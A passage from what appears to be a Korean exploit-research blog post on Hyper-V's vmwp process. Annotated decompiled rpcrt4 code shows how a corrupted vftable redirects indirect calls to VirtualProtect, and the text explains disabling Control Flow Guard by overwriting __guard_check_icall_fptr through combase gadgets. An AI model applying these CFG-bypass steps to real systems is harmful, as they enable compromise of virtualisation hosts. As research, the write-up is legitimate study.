          &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (*((_DWORD *)v28 + &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x130010&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; (Microsoft_Windows_RPCEnableBits &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )&lt;span class=&#34;hljs-comment&#34;&gt;// avoid here&lt;/span&gt;
          {
            v59 = BINDING_HANDLE::GetImpersonationLevel(v28);
            v60 = BINDING_HANDLE::GetAuthenticationService(v28);
            v61 = BINDING_HANDLE::GetAuthenticationLevel(v28);
            v62 = (*(__int64 (__fastcall **)(BINDING_HANDLE *))(*(_QWORD *)v28 + &lt;span class=&#34;hljs-number&#34;&gt;344&lt;/span&gt;i64))(v28);
            v63 = (*(__int64 (__fastcall **)(BINDING_HANDLE *))(*(_QWORD *)v28 + &lt;span class=&#34;hljs-number&#34;&gt;336&lt;/span&gt;i64))(v28);
            v64 = (*(__int64 (__fastcall **)(BINDING_HANDLE *))(*(_QWORD *)v28 + &lt;span class=&#34;hljs-number&#34;&gt;328&lt;/span&gt;i64))(v28);
            v65 = (*(__int64 (__fastcall **)(BINDING_HANDLE *))(*(_QWORD *)v28 + &lt;span class=&#34;hljs-number&#34;&gt;320&lt;/span&gt;i64))(v28);
            v94 = v62;
            RpcMsg1 = v98;
            McTemplateU0jqqzzzqqq(
              v66,
              (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&amp;amp;RpcClientCallStartEvent,
              &amp;amp;v101-&amp;gt;RpcInterfaceInformation-&amp;gt;InterfaceId,
              v98-&amp;gt;ProcNum,
              v65,
              v64,
              v63,
              v94,
              v61,
              v60,
              v59);
            v30 = v96;
          }
          v36 = (*(__int64 (__fastcall **)(BINDING_HANDLE *, PRPC_MESSAGE))(*(_QWORD *)v28 + &lt;span class=&#34;hljs-number&#34;&gt;0x68&lt;/span&gt;i64))(v28, RpcMsg1);&lt;span class=&#34;hljs-comment&#34;&gt;// make corrupted vftable[0] + 0x68 points VirtualProtect in DispatchTable&lt;/span&gt;
          &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v36 )
            &lt;span class=&#34;hljs-keyword&#34;&gt;goto&lt;/span&gt; LABEL_57;
          v28 = (BINDING_HANDLE *)RpcMsg1-&amp;gt;Handle;
          v116 = RpcMsg1-&amp;gt;Handle;
        }
        v33 = *(__int64 (__fastcall **)(OSF_SCALL *__hidden, struct _RPC_MESSAGE *, struct _GUID *))(*(_QWORD *)v28 + &lt;span class=&#34;hljs-number&#34;&gt;0x70&lt;/span&gt;i64);&lt;span class=&#34;hljs-comment&#34;&gt;// call RpcMsg-&amp;gt;Handle[0] + 0x70 =&amp;gt; VirtualProtect&lt;/span&gt;
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v33 == OSF_SCALL::GetBuffer )
        {
          v34 = OSF_SCALL::GetBuffer(v28, RpcMsg1, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64);
        }
        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v33 == LRPC_SCALL::GetBuffer )
        {
          v34 = LRPC_SCALL::GetBuffer(v28, RpcMsg1, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64);
        }
        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
        {
          v34 = v33(v28, RpcMsg1, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64);        &lt;span class=&#34;hljs-comment&#34;&gt;// make corrupted vftable[0] + 0x70 points VirtualProtect in DispatchTable&lt;/span&gt;
        }
LABEL_56:
        v36 = v34;
LABEL_57:
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !v30 &amp;amp;&amp;amp; v36 )
        {
          &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (Microsoft_Windows_RPCEnableBits &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
            McTemplateU0q(v35, &amp;amp;RpcClientCallEndEvent, v36);
          &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)IsEEInfoEtwEnabled() )
            LogEEInfoToEtw();
        }
        &lt;span class=&#34;hljs-keyword&#34;&gt;goto&lt;/span&gt; LABEL_58;
      }
      v36 = &lt;span class=&#34;hljs-number&#34;&gt;14&lt;/span&gt;;
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
    {
      v36 = &lt;span class=&#34;hljs-number&#34;&gt;0x6A6&lt;/span&gt;;
    }
LABEL_58:
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v36 )
    {
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( pStubMsg.pAsyncMsg &amp;amp;&amp;amp; pStubMsg.IsClient )
        *((_WORD *)pStubMsg.pAsyncMsg + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) |= &lt;span class=&#34;hljs-number&#34;&gt;8u&lt;/span&gt;;
      RpcRaiseException(v36);
    }
    pStubMsg.Buffer = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)pStubMsg.RpcMsg-&amp;gt;Buffer;
    v37 = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)pStubMsg._bf_c0;
    LODWORD(v37) = pStubMsg._bf_c0 | &lt;span class=&#34;hljs-number&#34;&gt;0x200&lt;/span&gt;;
    pStubMsg._bf_c0 |= &lt;span class=&#34;hljs-number&#34;&gt;0x200&lt;/span&gt;u;
    &lt;span class=&#34;hljs-keyword&#34;&gt;goto&lt;/span&gt; LABEL_60;
  }&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;v28&lt;/code&gt;&amp;#xC774; &amp;#xC870;&amp;#xC791;&amp;#xB41C; vftable&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xAC8C; &amp;#xB418;&amp;#xACE0; &amp;#xB9E4;&amp;#xC6B0; &amp;#xBCF5;&amp;#xC7A1;&amp;#xD574; &amp;#xBCF4;&amp;#xC774;&amp;#xB294; &amp;#xC870;&amp;#xAC74;&amp;#xC744; &amp;#xAC00;&amp;#xC9C4; if&amp;#xBB38;&amp;#xACFC; &amp;#xB9CC;&amp;#xB098;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBCF5;&amp;#xC7A1;&amp;#xD574; &amp;#xBCF4;&amp;#xC778;&amp;#xB2E4;&amp;#xACE0; &amp;#xADF8;&amp;#xB0E5; &amp;#xC870;&amp;#xAC74;&amp;#xC744; &amp;#xBB34;&amp;#xC2DC;&amp;#xD574;&amp;#xC11C; else&amp;#xB85C; &amp;#xBD84;&amp;#xAE30;&amp;#xD558;&amp;#xAC8C; &amp;#xB418;&amp;#xBA74; &lt;code&gt;v36&lt;/code&gt;&amp;#xC774; 0x6a6&amp;#xC73C;&amp;#xB85C; &amp;#xC124;&amp;#xC815;&amp;#xB418;&amp;#xB294;&amp;#xB370;&amp;#xC694;? &amp;#xBC14;&amp;#xB85C; &amp;#xB2E4;&amp;#xC74C; if &amp;#xBB38;&amp;#xC744; &amp;#xBCF4;&amp;#xC2DC;&amp;#xBA74; &lt;code&gt;v36&lt;/code&gt;&amp;#xC774; 0&amp;#xC774; &amp;#xC544;&amp;#xB2C8;&amp;#xBA74; &amp;#xC584;&amp;#xC9E4; &amp;#xC5C6;&amp;#xC774; &lt;code&gt;RpcRaiseException&lt;/code&gt;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xBA74;&amp;#xC11C; &amp;#xC608;&amp;#xC678;&amp;#xB97C; &amp;#xC5BB;&amp;#xC5B4;&amp;#xB9DE;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &lt;del&gt;&lt;code&gt;NdrStubCall2&lt;/code&gt;: &amp;#xC790;&amp;#xC138;&amp;#xD788; &amp;#xC548; &amp;#xBCFC;&amp;#xAC70;&amp;#xC57C;? &amp;#x3147;&amp;#x314B;&amp;#x3147;&amp;#x314B; &amp;#xD130;&amp;#xC9C8;&amp;#xAC8C;&lt;/del&gt;&lt;br&gt;&amp;#xB2E4; &amp;#xB410;&amp;#xB2E4;&amp;#xACE0; &amp;#xC0DD;&amp;#xAC01;&amp;#xD55C; &amp;#xC2DC;&amp;#xC810;&amp;#xC5D0;&amp;#xC11C; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xB97C; &amp;#xB9DE;&amp;#xACE0; &amp;#xB2E4;&amp;#xC2DC; &amp;#xD55C; &amp;#xBC88; &amp;#xC88C;&amp;#xC808;&amp;#xAC10;&amp;#xC744; &amp;#xB9DB; &amp;#xBCF8; &amp;#xC800;&amp;#xB294; &amp;#xC870;&amp;#xAC74;&amp;#xC744; &amp;#xB9DE;&amp;#xCDB0; &amp;#xC8FC;&amp;#xB824;&amp;#xACE0; &amp;#xAC00;&amp;#xC9DC; vftable&amp;#xC758; &amp;#xB450; &amp;#xBC88;&amp;#xC9F8; &amp;#xC5D4;&amp;#xD2B8;&amp;#xB9AC;&amp;#xB97C; 0x33307c89abcdef&amp;#xB85C; &amp;#xC124;&amp;#xC815;&amp;#xD574;&amp;#xC11C; if&amp;#xBB38;&amp;#xC73C;&amp;#xB85C; &amp;#xBD84;&amp;#xAE30;&amp;#xD558;&amp;#xAC8C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &lt;code&gt;NdrpServerUnMarshal&lt;/code&gt;&amp;#xB54C;&amp;#xCC98;&amp;#xB7FC; &lt;code&gt;v33 = *(__int64 (__fastcall **)(OSF_SCALL *__hidden, struct _RPC_MESSAGE *, struct _GUID *))(*(_QWORD *)v28 + 0x70i64);&lt;/code&gt;&amp;#xB85C; &amp;#xC5BB;&amp;#xC5B4;&amp;#xC9C4; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &lt;code&gt;VirtualProtect&lt;/code&gt;&amp;#xB85C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xC5B4;&amp;#xC918; &lt;code&gt;v34 = v33(v28, RpcMsg1, 0i64);&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; 0&amp;#xC774; &amp;#xBC18;&amp;#xD658;&amp;#xB418;&amp;#xC5B4; &lt;code&gt;RpcRaiseException&lt;/code&gt;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xD53C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xACE0; &lt;code&gt;NdrStubCall2&lt;/code&gt; &amp;#xBB34;&amp;#xC0AC;&amp;#xD788; &amp;#xBC18;&amp;#xD658;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026;&lt;/p&gt;
&lt;p&gt;&amp;#xC9C0;&amp;#xAE08;&amp;#xAE4C;&amp;#xC9C0; &lt;code&gt;NdrServerCall2&lt;/code&gt;&amp;#xC744; &amp;#xBD84;&amp;#xC11D;&amp;#xD574;&amp;#xBCF4;&amp;#xBA70; &amp;#xC784;&amp;#xC758;&amp;#xC758; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xC784;&amp;#xC758;&amp;#xC758; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &amp;#xC548;&amp;#xC804;&amp;#xD558;&amp;#xAC8C;(?) &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xBC29;&amp;#xBC95;&amp;#xC744; &amp;#xC54C;&amp;#xC544;&amp;#xBD24;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774; &amp;#xACFC;&amp;#xC815;&amp;#xC744; &amp;#xC54C;&amp;#xC544;&amp;#xB0B4;&amp;#xAE30;&amp;#xAE4C;&amp;#xC9C0; &amp;#xC800;&amp;#xC758; &amp;#xAC00;&amp;#xC0C1;&amp;#xBA38;&amp;#xC2E0;&amp;#xC774; &amp;#xACAA;&amp;#xC5C8;&amp;#xC744; &amp;#xC218;&amp;#xB9CE;&amp;#xC740; &amp;#xC2A4;&amp;#xB0C5;&amp;#xC0F7; &amp;#xBCF5;&amp;#xC6D0;&amp;#xC5D0; &amp;#xB9C8;&amp;#xC74C;&amp;#xC774; &amp;#xC544;&amp;#xD504;&amp;#xB124;&amp;#xC694;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/10/30/pwndorei/newjeans-hyper-v-pt5/image3.png&#34; alt&gt;&lt;/p&gt;
&lt;h2 id=&#34;Neutralizing-CFG&#34;&gt;&lt;a href=&#34;#Neutralizing-CFG&#34; class=&#34;headerlink&#34; title=&#34;Neutralizing CFG&#34;&gt;&lt;/a&gt;Neutralizing CFG&lt;/h2&gt;&lt;p&gt;&amp;#xADF8;&amp;#xB798;&amp;#xC11C; &amp;#xC774;&amp;#xAC70;&amp;#xB85C; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; CFG&amp;#xB97C; &amp;#xC6B0;&amp;#xD68C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC744;&amp;#xAE4C;&amp;#xC694;?  &amp;#xBA3C;&amp;#xC800; &lt;code&gt;Invoke&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; CFG &amp;#xCCB4;&amp;#xD06C;&amp;#xB97C; &amp;#xC704;&amp;#xD574; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &lt;code&gt;RpcInvokeCheckICall&lt;/code&gt;&amp;#xC744; &amp;#xBCF4;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC740;&amp;#xB370;&amp;#xC694;?&lt;br&gt;&lt;img src=&#34;/2023/10/30/pwndorei/newjeans-hyper-v-pt5/image4.png&#34; alt&gt;&lt;br&gt;&lt;code&gt;rpcrt4!__guard_check_icall_fptr&lt;/code&gt;&amp;#xC774; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&amp;#xB9CC;&amp;#xC57D; &lt;code&gt;rpcrt4!__guard_check_icall_fptr&lt;/code&gt;&amp;#xC5D0; &amp;#xC4F0;&amp;#xAE30; &amp;#xAD8C;&amp;#xD55C;&amp;#xC744; &amp;#xBD80;&amp;#xC5EC;&amp;#xD558;&amp;#xACE0; &amp;#xBC14;&amp;#xB85C; &lt;code&gt;ret&lt;/code&gt; &amp;#xBA85;&amp;#xB839;&amp;#xC744; &amp;#xC218;&amp;#xD589;&amp;#xD558;&amp;#xB294; &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C; &amp;#xB36E;&amp;#xC5B4;&amp;#xC4F4; &amp;#xB2E4;&amp;#xBA74; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xB420;&amp;#xAE4C;&amp;#xC694;? CFG&amp;#xAC00; &amp;#xD65C;&amp;#xC131;&amp;#xD654;&amp;#xB294; &amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC9C0;&amp;#xB9CC; &lt;code&gt;ntdll!LdrpValidateUserCallTarget&lt;/code&gt;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xC9C0; &amp;#xC54A;&amp;#xC544; CFG&amp;#xAC00; &amp;#xC788;&amp;#xC73C;&amp;#xB098; &amp;#xB9C8;&amp;#xB098;&amp;#xC778; &amp;#xC0C1;&amp;#xD0DC;&amp;#xAC00; &amp;#xB418;&amp;#xC5B4;&amp;#xBC84;&amp;#xB9BD;&amp;#xB2C8;&amp;#xB2E4;!! &amp;#xB2E4;&amp;#xD589;&amp;#xD788; &lt;code&gt;VirtualProtect&lt;/code&gt;&amp;#xB294; &amp;#xAC04;&amp;#xC811; &amp;#xD638;&amp;#xCD9C;&amp;#xC744; &amp;#xD558;&amp;#xB354;&amp;#xB77C;&amp;#xB3C4; CFG&amp;#xC5D0; &amp;#xAC78;&amp;#xB9AC;&amp;#xC9C0; &amp;#xC54A;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;! &amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC704; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; &amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574;&amp;#xC120; &amp;#xC801;&amp;#xC5B4;&amp;#xB3C4; &amp;#xC138; &amp;#xBC88;&amp;#xC758; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xC740; &amp;#xD544;&amp;#xC694;&amp;#xD560; &amp;#xAC83;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB2E4;&amp;#xD589;&amp;#xD788; &amp;#xAC04;&amp;#xC811; &amp;#xD638;&amp;#xCD9C;&amp;#xC744; &amp;#xBC18;&amp;#xBCF5;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xAC00;&amp;#xC82F;&amp;#xC774; &lt;code&gt;combase.dll&lt;/code&gt;&amp;#xC5D0; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;! &lt;/p&gt;
&lt;h2 id=&#34;Loop-Indirect-Call&#34;&gt;&lt;a href=&#34;#Loop-Indirect-Call&#34; class=&#34;headerlink&#34; title=&#34;Loop Indirect Call&#34;&gt;&lt;/a&gt;Loop Indirect Call&lt;/h2&gt;&lt;p&gt;&amp;#xC544;&amp;#xB798;&amp;#xB294; &lt;code&gt;combase!RegistrationStore::Context&lt;/code&gt;&amp;#xC758; &lt;code&gt;RevertChanges&lt;/code&gt;&amp;#xB77C;&amp;#xB294; &amp;#xBA54;&amp;#xC18C;&amp;#xB4DC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&lt;img src=&#34;/2023/10/30/pwndorei/newjeans-hyper-v-pt5/image5.png&#34; alt&gt;&lt;br&gt;&lt;code&gt;Context+0xb0&lt;/code&gt;&amp;#xC5D0; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; &lt;code&gt;_List_ENTRY&lt;/code&gt;&amp;#xB85C; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9C4; &amp;#xC5F0;&amp;#xACB0;&amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB97C; &lt;code&gt;Blink&lt;/code&gt;&amp;#xBC29;&amp;#xD5A5;&amp;#xC73C;&amp;#xB85C; &amp;#xC21C;&amp;#xD68C;&amp;#xD558;&amp;#xBA74;&amp;#xC11C; vftable+0x70&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xBC18;&amp;#xBCF5;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xD638;&amp;#xCD9C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC5F0;&amp;#xACB0; &amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB97C; &amp;#xAD6C;&amp;#xC131;&amp;#xD558;&amp;#xB824;&amp;#xBA74; &amp;#xD799; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC54C;&amp;#xC544;&amp;#xC57C; &amp;#xD558;&amp;#xB294;&amp;#xB370; &amp;#xC774;&amp;#xB294; &lt;code&gt;VideoDirtListener + 0x58&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;VideoDirtListener&lt;/code&gt;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xAC00; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC5B4;&amp;#xC11C; &amp;#xC27D;&amp;#xAC8C; &amp;#xC54C;&amp;#xC544;&amp;#xB0BC; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB610;&amp;#xD55C; &lt;code&gt;Blink&lt;/code&gt;&amp;#xAC00; &lt;code&gt;RPC_MESSAGE&lt;/code&gt;&amp;#xC758; &amp;#xB2E4;&amp;#xB978; &amp;#xC911;&amp;#xC694;&amp;#xD55C; &amp;#xD544;&amp;#xB4DC;&amp;#xC640; &amp;#xC624;&amp;#xD504;&amp;#xC14B;&amp;#xC774; &amp;#xACB9;&amp;#xCE58;&amp;#xC9C0; &amp;#xC54A;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0;&lt;br&gt;&amp;#xC5EC;&amp;#xB7EC; &amp;#xAC1C;&amp;#xC758; &amp;#xB178;&amp;#xB4DC;&amp;#xB4E4;&amp;#xB85C; &amp;#xC5F0;&amp;#xACB0;&amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB97C; &amp;#xAD6C;&amp;#xC131;&amp;#xD558;&amp;#xACE0; &amp;#xC774; &amp;#xAC00;&amp;#xC82F;&amp;#xC744; &amp;#xD65C;&amp;#xC6A9;&amp;#xD574;&amp;#xC11C; &amp;#xAC01;&amp;#xAC01;&amp;#xC758; &amp;#xB178;&amp;#xB4DC;&amp;#xB4E4;&amp;#xC744; &amp;#xC21C;&amp;#xD68C;&amp;#xD558;&amp;#xBA70; &amp;#xC2A4;&amp;#xC2A4;&amp;#xB85C;&amp;#xB97C; &amp;#xC778;&amp;#xC790;(&lt;code&gt;RPC_MESSAGE&lt;/code&gt;)&amp;#xB85C; &amp;#xC0BC;&amp;#xC544; &lt;code&gt;NdrServerCall2&lt;/code&gt;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB610;&amp;#xD55C; &amp;#xAC01;&amp;#xAC01;&amp;#xC758; &amp;#xB178;&amp;#xB4DC;(&lt;code&gt;RPC_MESSAGE&lt;/code&gt;)&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xAC19;&amp;#xC740; &lt;code&gt;RPC_SERVER_INTERFACE&lt;/code&gt;&amp;#xC640; &lt;code&gt;MIDL_SERVER_INFO&lt;/code&gt;, &lt;code&gt;DispatchTable&lt;/code&gt;&amp;#xACFC; &lt;code&gt;vftable&lt;/code&gt;&amp;#xC744; &amp;#xACF5;&amp;#xC720;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC5B4;&amp;#xC11C; &lt;del&gt;&amp;#xC2EC;&amp;#xAC01;&amp;#xD560; &amp;#xC815;&amp;#xB3C4;&amp;#xB85C;&lt;/del&gt; &amp;#xBCF5;&amp;#xC7A1;&amp;#xD574;&amp;#xC9C0;&amp;#xC9C0; &amp;#xC54A;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&amp;#xADF8;&amp;#xB7FC; &amp;#xC774;&amp;#xC81C; &amp;#xC5B4;&amp;#xB5A4; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xB85C; CFG&amp;#xB97C; &amp;#xBB34;&amp;#xB825;&amp;#xD654;&amp;#xD560;&amp;#xC9C0; &amp;#xC54C;&amp;#xC544;&amp;#xBCF4;&amp;#xC2DC;&amp;#xC8E0;&lt;/p&gt;
&lt;h3 id=&#34;VirtualProtect&#34;&gt;&lt;a href=&#34;#VirtualProtect&#34; class=&#34;headerlink&#34; title=&#34;VirtualProtect&#34;&gt;&lt;/a&gt;&lt;code&gt;VirtualProtect&lt;/code&gt;&lt;/h3&gt;&lt;p&gt;&amp;#xC815;&amp;#xB9D0; &amp;#xB2E4;&amp;#xD589;&amp;#xD788; &lt;code&gt;VirtualProtect&lt;/code&gt;&amp;#xB294; &amp;#xAC04;&amp;#xC811; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xC5B4;&amp;#xB3C4; &amp;#xB418;&amp;#xB294; &amp;#xC720;&amp;#xD6A8;&amp;#xD55C; &amp;#xD568;&amp;#xC218;&amp;#xC600;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &lt;code&gt;VirtualProtect(rpcrt4!_guard_check_icall_fptr, 8, PAGE_READWRITE, VALID_ADDRESS)&lt;/code&gt;&amp;#xC640; &amp;#xAC19;&amp;#xC740; &amp;#xD638;&amp;#xCD9C;&amp;#xC744; &amp;#xBC1C;&amp;#xC0DD;&amp;#xC2DC;&amp;#xCF1C;&amp;#xC11C; &amp;#xBA3C;&amp;#xC800; &lt;code&gt;rpcrt4!__guard_check_icall_fptr&lt;/code&gt;&amp;#xC5D0; &amp;#xC4F0;&amp;#xAE30; &amp;#xAD8C;&amp;#xD55C;&amp;#xC744; &amp;#xBD80;&amp;#xC5EC;&amp;#xD569;&amp;#xC2DC;&amp;#xB2E4;&lt;/p&gt;
&lt;h3 id=&#34;combase-GenericStreamBase-lt-IStream-CoTaskMemAllocAllocator-gt-GetCopy&#34;&gt;&lt;a href=&#34;#combase-GenericStreamBase-lt-IStream-CoTaskMemAllocAllocator-gt-GetCopy&#34; class=&#34;headerlink&#34; title=&#34;combase!GenericStreamBase&amp;lt;IStream,CoTaskMemAllocAllocator&amp;gt;::GetCopy&#34;&gt;&lt;/a&gt;&lt;code&gt;combase!GenericStreamBase&amp;lt;IStream,CoTaskMemAllocAllocator&amp;gt;::GetCopy&lt;/code&gt;&lt;/h3&gt;&lt;p&gt;&amp;#xC4F0;&amp;#xAE30; &amp;#xAC00;&amp;#xB2A5;&amp;#xD574;&amp;#xC9C4; &lt;code&gt;rpcrt4!__guard_check_icall_fptr&lt;/code&gt;&amp;#xC5D0; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC4F0;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &amp;#xC77C;&amp;#xBC18;&amp;#xC801;&amp;#xC778; &lt;code&gt;memcpy&lt;/code&gt; &amp;#xB4F1;&amp;#xC744; &amp;#xC4F0;&amp;#xBA74; CFG&amp;#xC5D0; &amp;#xC758;&amp;#xD574; vmwp&amp;#xAC00; &amp;#xC885;&amp;#xB8CC;&amp;#xB418;&amp;#xACE0; &amp;#xB9D9;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026; &amp;#xB530;&amp;#xB77C;&amp;#xC11C; CFG&amp;#xC5D0; &amp;#xAC78;&amp;#xB9AC;&amp;#xC9C0; &amp;#xC54A;&amp;#xB294; &lt;code&gt;combase!GenericStreamBase&amp;lt;IStream,CoTaskMemAllocAllocator&amp;gt;::GetCopy&lt;/code&gt;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;__int64 __fastcall GenericStreamBase&amp;lt;IStream,CoTaskMemAllocAllocator&amp;gt;::GetCopy(GenericStreamBase&amp;lt;IStream,AllocationWrapper&amp;gt; *&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *pBuff)
{
  memcpy_0(pBuff, (*&amp;amp;&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;-&amp;gt;_cbDataSize + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;i64), &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;-&amp;gt;_lOffset);
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
}&lt;/code&gt;&lt;/pre&gt;
